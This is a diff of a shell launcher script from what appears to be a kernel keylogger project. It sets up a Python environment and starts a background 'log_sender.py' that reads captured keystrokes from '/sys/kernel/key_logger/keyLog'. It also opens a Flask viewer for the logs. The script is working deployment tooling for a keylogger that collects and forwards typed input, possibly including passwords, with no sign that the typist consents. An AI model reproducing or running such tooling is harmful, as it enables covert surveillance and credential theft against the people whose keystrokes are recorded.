@@ -23,12 +23,21 @@ mknod "$DEVICE" c 244 0
 
 
 #run python on background
+echo "Installing portable conda Env"
 mkdir ../myenv
 tar -xf ../BE/klenv.tar.gz -C ../myenv
 source ../myenv/bin/activate
 pip install python-dotenv
-echo "Running script in: "
+echo "Running BackEnd script in: "
 echo $(which python)
-$(which python) ../BE/log_sender.py -f /sys/kernel/key_logger/keyLog  -t 4
-  
+$(which python) ../BE/log_sender.py -f "/sys/kernel/key_logger/keyLog"  -t 5 &
+sleep 5s
+echo "Running frotEnd logs viewer"
+export FLASK_ENV=development
+export FLASK_APP=../FE/main.py
+flask run &
+sleep 5s
+xdg-open https://localhost:5000
+
+
 
